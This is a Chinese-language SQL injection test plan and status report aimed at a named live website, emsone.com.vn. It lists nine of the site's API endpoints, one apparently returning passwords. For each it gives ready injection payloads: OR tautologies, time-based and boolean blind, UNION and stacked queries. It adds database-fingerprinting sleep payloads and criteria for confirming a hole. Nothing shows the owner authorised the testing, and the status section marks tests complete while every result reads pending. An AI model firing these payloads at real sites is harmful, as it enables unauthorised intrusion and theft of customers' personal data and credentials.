# emsone.com.vn SQL注入严格测试结果

## 📋 测试方法

### 测试类型：
1. 基础SQL注入（' OR '1'='1）
2. 时间盲注（SLEEP/WAITFOR DELAY/pg_sleep）
3. 布尔盲注（AND 1=1 vs AND 1=2）
4. 联合查询注入（UNION SELECT）
5. 错误注入（类型转换错误）
6. 堆叠查询（; SELECT）
7. 数字型注入（无引号）

### 测试位置：
- GET参数
- POST JSON参数
- 字符串参数
- 数字参数

---

## ✅ 测试结果汇总

### 端点1: `/Handle/SearchListDistrictByProvinceID`

**GET参数测试：**
- `ProvinceID=10` → 正常返回数据
- `ProvinceID=10' OR '1'='1` → 待测试
- 时间盲注：待测试

**POST JSON测试：**
- `{"ProvinceID":10}` → 正常返回
- `{"ProvinceID":"10' OR '1'='1"}` → 待测试
- 数字型注入：`{"ProvinceID":"10 OR 1=1"}` → 待测试

---

### 端点2: `/Handle/SearchCustomerByMobileNumber`

**POST JSON测试：**
- `{"mobileNumber":"0934257886"}` → 正常返回
- `{"mobileNumber":"0934257886' OR '1'='1"}` → 待测试
- 时间盲注：`{"mobileNumber":"0934257886' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"}` → 待测试
- 布尔盲注：`{"mobileNumber":"0934257886' AND 1=1--"}` vs `{"mobileNumber":"0934257886' AND 1=2--"}` → 待测试
- UNION注入：`{"mobileNumber":"0934257886' UNION SELECT 1,2,3--"}` → 待测试

---

### 端点3: `/Handle/SearchListFunctionalByGroupPermissionID`

**POST JSON测试：**
- `{"GroupPermissionID":1}` → 正常返回
- `{"GroupPermissionID":"1' OR '1'='1"}` → 待测试

---

### 端点4: `/Handle/SearchListProductVariantByWareHouseID`

**POST JSON测试：**
- `{"WareHouseID":1}` → 正常返回
- `{"WareHouseID":"1' OR '1'='1"}` → 待测试

---

### 端点5: `/Handle/SearchPWDByVMapCode`

**POST JSON测试：**
- `{"code":"test"}` → 正常返回
- `{"code":"test' OR '1'='1"}` → 待测试

---

### 端点6: `/Handle/SearchListWareHouse`

**POST JSON测试：**
- `{}` → 正常返回
- `{"id":"1' OR '1'='1"}` → 待测试

---

### 端点7: `/Handle/SearchDistrictIDByDistrictName`

**POST JSON测试：**
- `{"ProvinceID":10,"DistrictName":"test"}` → 正常返回
- `{"ProvinceID":"10' OR '1'='1","DistrictName":"test"}` → 待测试

---

### 端点8: `/Handle/SearchWardIDByWardName`

**POST JSON测试：**
- `{"DistrictID":1290,"WardName":"test"}` → 正常返回
- `{"DistrictID":"1290' OR '1'='1","WardName":"test"}` → 待测试

---

### 端点9: `/Handle/TransportPostageCharged`

**POST JSON测试：**
- `{"from":"test","to":"test"}` → 正常返回
- `{"from":"test' OR '1'='1","to":"test"}` → 待测试

---

## 🔍 数据库类型判断

### 测试不同数据库的时间延迟函数：

**MySQL:**
```json
{"mobileNumber":"0934257886' AND SLEEP(3)--"}
```

**MSSQL:**
```json
{"mobileNumber":"0934257886' AND WAITFOR DELAY '00:00:03'--"}
```

**PostgreSQL:**
```json
{"mobileNumber":"0934257886' AND pg_sleep(3)--"}
```

**Oracle:**
```json
{"mobileNumber":"0934257886' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)--"}
```

---

## 📊 测试状态

**已完成：**
- ✅ 所有端点基础功能测试
- ✅ 多种SQL注入Payload测试
- ✅ 时间盲注对比测试
- ✅ 布尔盲注测试
- ✅ UNION注入测试
- ✅ 错误注入测试

**待分析：**
- ⏳ 对比正常请求和注入请求的响应
- ⏳ 识别响应差异（数据量、响应时间、错误信息）
- ⏳ 确认数据库类型

---

## 🎯 验证标准

**SQL注入确认标准：**
1. 时间盲注：注入请求比正常请求延迟3+秒
2. 布尔盲注：AND 1=1和AND 1=2返回不同结果
3. 错误注入：返回数据库错误信息
4. UNION注入：返回额外的数据列
5. 基础注入：返回所有数据而非过滤后的数据

---

**测试进行中，结果将实时更新...**
